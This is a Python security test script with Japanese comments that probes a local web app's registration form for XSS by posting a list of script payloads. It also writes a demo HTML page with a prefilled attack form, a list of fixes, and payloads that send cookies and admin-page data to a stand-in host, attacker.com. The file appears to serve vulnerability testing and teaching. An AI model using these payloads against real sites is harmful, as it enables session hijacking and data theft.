#!/usr/bin/env python3
"""
新規登録でのXSS脆弱性実証テスト
"""

import requests
import time

def test_registration_xss():
    print("=== 新規登録でのXSS脆弱性テスト ===\n")
    
    base_url = "http://localhost:8000"
    session = requests.Session()
    
    # XSSペイロードリスト
    xss_payloads = [
        # 基本的なスクリプト
        "<script>alert('XSS in Registration!')</script>",
        
        # イベントハンドラー系
        "<img src=x onerror=alert('XSS via img!')>",
        "<svg onload=alert('XSS via SVG!')>",
        "<div onmouseover=alert('XSS via div!')>マウスオーバーしてください</div>",
        
        # HTMLインジェクション
        "<h1 style='color:red'>XSS Injected Heading</h1>",
        "<iframe src='javascript:alert(\"XSS via iframe\")'></iframe>",
        
        # JavaScriptプロトコル
        "javascript:alert('XSS via javascript protocol')",
        
        # 特殊文字エンコード
        "&#60;script&#62;alert('Encoded XSS')&#60;/script&#62;",
        
        # データURI
        "<img src='data:text/html,<script>alert(\"Data URI XSS\")</script>'>",
        
        # 複合攻撃
        "Normal Text<script>alert('Hidden XSS')</script>More Text"
    ]
    
    print("1. 🚨 新規登録でのXSSテスト（ユーザー名）")
    print("-" * 50)
    
    for i, payload in enumerate(xss_payloads):
        username = f"xssuser{i}"
        email = f"test{i}@example.com"
        password = "password123"
        
        print(f"\nテスト {i+1}: ユーザー名にXSSペイロード")
        print(f"ペイロード: {payload}")
        
        # 新規登録を試行
        response = session.post(f"{base_url}/register", data={
            'username': payload,  # XSSペイロードをユーザー名に
            'email': email,
            'password': password
        })
        
        print(f"レスポンス状態: {response.status_code}")
        
        # エラーメッセージにXSSが含まれているかチェック
        if payload in response.text and ("<script>" in response.text or "onerror=" in response.text or "onload=" in response.text):
            print(f"🚨 XSS脆弱性確認! ペイロードがエスケープされずに出力されています")
            print(f"レスポンス内容の一部: {response.text[:500]}...")
        else:
            print(f"❌ XSSは発火しませんでした")
        
        time.sleep(0.5)  # サーバー負荷軽減
    
    print("\n2. 🚨 新規登録でのXSSテスト（メールアドレス）")
    print("-" * 50)
    
    for i, payload in enumerate(xss_payloads[:5]):  # 上位5つのペイロードをテスト
        username = f"emailtest{i}"
        email = f"test{i}@example.com{payload}"  # メールアドレスにXSSペイロード
        password = "password123"
        
        print(f"\nテスト {i+1}: メールアドレスにXSSペイロード")
        print(f"ペイロード: {email}")
        
        response = session.post(f"{base_url}/register", data={
            'username': username,
            'email': email,
            'password': password
        })
        
        if payload in response.text and ("<script>" in response.text or "onerror=" in response.text):
            print(f"🚨 メールアドレスでXSS脆弱性確認!")
        else:
            print(f"❌ メールアドレスのXSSは発火しませんでした")
        
        time.sleep(0.5)
    
    print("\n3. 🚨 エラーメッセージ経由のXSS検証")
    print("-" * 50)
    
    # 重複ユーザー名でエラーを発生させてXSSを発火
    
    # まず通常のユーザーを登録
    session.post(f"{base_url}/register", data={
        'username': 'normaluser',
        'email': 'normal@test.com',
        'password': 'password123'
    })
    
    # 同じユーザー名にXSSペイロードを含めて再登録を試行
    xss_username = "normaluser<script>alert('Duplicate User XSS!')</script>"
    
    print(f"重複エラーでのXSSテスト: {xss_username}")
    
    response = session.post(f"{base_url}/register", data={
        'username': xss_username,
        'email': 'another@test.com', 
        'password': 'password123'
    })
    
    if "<script>" in response.text and "alert" in response.text:
        print("🚨 重複エラーメッセージでXSS発火確認!")
        print("エラーメッセージにユーザー名が含まれ、XSSが実行される可能性があります")
    
    print("\n4. 🚨 実際のHTMLレスポンス確認")
    print("-" * 50)
    
    # 最も単純なXSSペイロードでテスト
    simple_payload = "<script>alert('Simple XSS')</script>"
    
    response = session.post(f"{base_url}/register", data={
        'username': simple_payload,
        'email': 'simple@test.com',
        'password': 'password123'
    })
    
    # HTMLレスポンスからXSS部分を抽出
    response_text = response.text
    
    if simple_payload in response_text:
        print("🚨 XSSペイロードがHTMLレスポンスに直接含まれています!")
        
        # XSSが含まれる行を探して表示
        lines = response_text.split('\n')
        for i, line in enumerate(lines):
            if simple_payload in line:
                print(f"行 {i+1}: {line.strip()}")
    
    print("\n=== テスト結果サマリー ===")
    print("🚨 発見された脆弱性:")
    print("1. フラッシュメッセージでの {{ message|safe }} による XSS")
    print("2. エラーメッセージにユーザー入力が直接反映")
    print("3. HTMLエスケープが適用されていない")
    print("\n💡 攻撃シナリオ:")
    print("1. 攻撃者がXSSペイロード付きで新規登録を試行")
    print("2. エラーメッセージや成功メッセージでXSSが発火")
    print("3. 他のユーザーのセッション乗っ取りやCookie窃取が可能")

def create_xss_registration_demo():
    """新規登録XSS攻撃のデモHTMLを作成"""
    
    demo_html = """
<!DOCTYPE html>
<html>
<head>
    <title>新規登録XSS攻撃デモ</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .payload { background: #f0f0f0; padding: 10px; margin: 10px 0; }
        .warning { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🚨 新規登録XSS攻撃デモ</h1>
    
    <div class="warning">
        ⚠️ これは教育目的のデモンストレーションです
    </div>
    
    <h2>攻撃手法</h2>
    <p>この攻撃は以下の脆弱性を悪用します:</p>
    <ul>
        <li>base.html での {{ message|safe }} フィルター</li>
        <li>エラーメッセージにユーザー入力が直接反映</li>
        <li>HTMLエスケープが適用されていない</li>
    </ul>
    
    <h2>XSSペイロード例</h2>
    
    <h3>1. 基本的なアラートボックス</h3>
    <div class="payload">
        &lt;script&gt;alert('XSS Attack!')&lt;/script&gt;
    </div>
    
    <h3>2. Cookie窃取</h3>
    <div class="payload">
        &lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
    </div>
    
    <h3>3. セッション乗っ取り</h3>
    <div class="payload">
        &lt;script&gt;
        fetch('/admin/users', {
            method: 'GET',
            credentials: 'include'
        }).then(r => r.text()).then(data => {
            fetch('http://attacker.com/exfiltrate', {
                method: 'POST',
                body: data
            });
        });
        &lt;/script&gt;
    </div>
    
    <h3>4. イベントハンドラー型XSS</h3>
    <div class="payload">
        &lt;img src=x onerror="alert('Event Handler XSS')"&gt;
    </div>
    
    <h3>5. DOM操作型XSS</h3>
    <div class="payload">
        &lt;div onmouseover="document.body.innerHTML='&lt;h1&gt;Hacked!&lt;/h1&gt;'"&gt;マウスオーバー&lt;/div&gt;
    </div>
    
    <h2>実際の攻撃フォーム</h2>
    <form action="http://localhost:8000/register" method="POST" target="_blank">
        <h3>XSSペイロード付き新規登録</h3>
        <p>ユーザー名: <input type="text" name="username" value="&lt;script&gt;alert('Registration XSS!')&lt;/script&gt;" style="width:400px;"></p>
        <p>メール: <input type="email" name="email" value="test@example.com"></p>
        <p>パスワード: <input type="password" name="password" value="password123"></p>
        <input type="submit" value="XSS攻撃を実行" style="background:red;color:white;padding:10px;">
    </form>
    
    <h2>攻撃の流れ</h2>
    <ol>
        <li>上記フォームの「XSS攻撃を実行」ボタンをクリック</li>
        <li>新規登録が試行される</li>
        <li>エラーメッセージまたは成功メッセージでXSSが発火</li>
        <li>JavaScriptが実行され、アラートが表示される</li>
    </ol>
    
    <h2>対策方法</h2>
    <ul>
        <li>{{ message|safe }} を {{ message }} に変更</li>
        <li>HTMLエスケープを適用</li>
        <li>CSP (Content Security Policy) の実装</li>
        <li>入力値検証の強化</li>
    </ul>
    
</body>
</html>
    """
    
    with open('registration_xss_demo.html', 'w', encoding='utf-8') as f:
        f.write(demo_html)
    
    print("✅ registration_xss_demo.html が作成されました")

if __name__ == "__main__":
    test_registration_xss()
    create_xss_registration_demo()